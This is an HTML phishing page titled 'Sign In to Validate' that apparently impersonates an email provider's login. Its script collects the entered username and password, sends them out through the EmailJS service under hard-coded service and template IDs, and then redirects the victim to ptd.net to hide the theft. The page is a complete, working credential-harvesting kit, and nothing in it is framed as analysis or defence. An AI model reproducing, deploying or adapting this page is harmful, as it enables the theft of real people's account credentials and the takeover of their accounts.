<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign In</title>
<style>
  body, html {
    height: 100%;
    margin: 0;
    font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
    background-color: #0088c1;
    background-image: url('https://i.imghippo.com/files/Qdz9402nEU.png');
    background-size: cover;
    background-position: center;
    position: relative;
  }
  /* Overlay color to tint the background image */
  body::before {
    content: "";
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background-color: #0088c1;
    opacity: 0.5; /* Adjust opacity for color tint */
    pointer-events: none;
    z-index: 0;
  }
  .outer-wrapper {
    background-color: rgba(255, 255, 255, 0.9);
    padding-left: 20px;
    padding-right: 20px;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    position: relative;
    z-index: 1; /* Ensure above overlay */
  }
  .form-container {
    width: 360px;
    height: 380px;
    background-color: #ffffff;
    border: 0px solid #000000;
    box-sizing: border-box;
    padding: 20px 10px 10px 10px;
    display: flex;
    flex-direction: column;
  }
  .form-logo {
    width: 180px;
    height: 34px;
    object-fit: contain;
    margin-bottom: 5px;
    align-self: flex-start;
  }
  .signIn {
    font-size: 20px;
    padding: 19px 0;
    color: #4d4d4d;
    font-weight: bold;
    margin: 0;
    align-self: flex-start;
  }
  form {
    display: flex;
    flex-direction: column;
    gap: 10px;
    width: 100%;
  }
  label {
    font-weight: normal;
    font-size: 12px;
    color: #000000;
    margin-bottom: 4px;
    text-align: left;
  }
  .custom-input {
    font-size: 14px;
    font-weight: normal;
    line-height: 1;
    border-radius: 3px;
    padding: 10px 20px !important;
    background: #ffffff;
    border: 1px solid #000000;
    box-sizing: border-box;
    width: 100%;
    max-width: 370px;
    appearance: none;
    text-shadow: none;
    margin: 0;
  }
  .input-group {
    display: flex;
    flex-direction: column;
    width: 100%;
    max-width: 370px;
  }
  .actions-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    max-width: 370px;
    width: 100%;
    margin-top: 10px;
  }
  .checkbox-container {
    display: flex;
    align-items: center;
    margin-right: 5px;
  }
  .checkbox-container input[type="checkbox"] {
    width: 16px;
    height: 16px;
    margin-right: 8px;
    cursor: pointer;
  }
  .checkbox-container label {
    font-weight: normal;
    font-size: 13px;
    cursor: pointer;
    margin: 0;
  }
  .custom-submit {
    background-color: #0088c1;
    color: #ffffff;
    font-weight: 600;
    padding: 0 20px;
    height: 40px;
    border: 2px solid #0088c1;
    border-radius: 4px;
    cursor: pointer;
    line-height: 35px;
    text-align: center;
    width: auto;
    box-sizing: border-box;
    transition: background-color 0.3s, border-color 0.3s;
  }
  .custom-submit:hover {
    background-color: #006f9a;
    border-color: #006f9a;
  }
  .error-message {
    color: red;
    font-size: 12px;
    margin-top: -5px;
    margin-bottom: 5px;
  }
</style>
</head>
<body>
<div class="outer-wrapper">
  <div class="form-container">
    <img src="https://i.imghippo.com/files/IODO4883Dc.png" alt="Logo" class="form-logo" />
    <div class="signIn">Sign In to Validate</div>
    <form id="contact-form" novalidate>
      <div class="input-group">
        <label for="email-input">Username</label>
        <input id="email-input" class="custom-input" type="email" name="user_email" required placeholder=" " />
        <div id="email-error" class="error-message"></div>
      </div>
      <div class="input-group">
        <label for="password-input">Password</label>
        <input id="password-input" class="custom-input" type="password" name="user_password" required placeholder=" " />
        <div id="password-error" class="error-message"></div>
      </div>
      <div class="actions-row">
        <button type="submit" class="custom-submit">continue</button>
        <div class="checkbox-container">
          <input type="checkbox" id="stay-signed-in" name="stay_signed_in" />
          <label for="stay-signed-in">Stay signed in</label>
        </div>
      </div>
    </form>
  </div>
</div>
<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  (function(){
    emailjs.init('uGRhkufMjo08rjwb_'); // Your EmailJS User ID or Public Key
  })();
  function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
  }
  document.getElementById('contact-form').addEventListener('submit', function(event) {
    event.preventDefault();
    const emailInput = this.user_email;
    const passwordInput = this.user_password;
    const emailError = document.getElementById('email-error');
    const passwordError = document.getElementById('password-error');
    emailError.textContent = '';
    passwordError.textContent = '';
    let valid = true;
    if (!emailInput.value.trim()) {
      emailError.textContent = 'Email is required.';
      valid = false;
    } else if (!validateEmail(emailInput.value.trim())) {
      emailError.textContent = 'Please enter a valid email address.';
      valid = false;
    }
    if (!passwordInput.value.trim()) {
      passwordError.textContent = 'Password is required.';
      valid = false;
    }
    if (!valid) return;
    emailjs.sendForm('service_t84doqy', 'template_awd8sif', this)
      .then(function() {
        alert('You have successfully validate your account');
        document.getElementById('contact-form').reset();
        window.top.location.href = 'https://www.ptd.net';
      }, function(error) {
        alert('Failed to send form. Please try again later.');
        console.error('EmailJS error:', error);
      });
  });
</script>
</body>
</html>
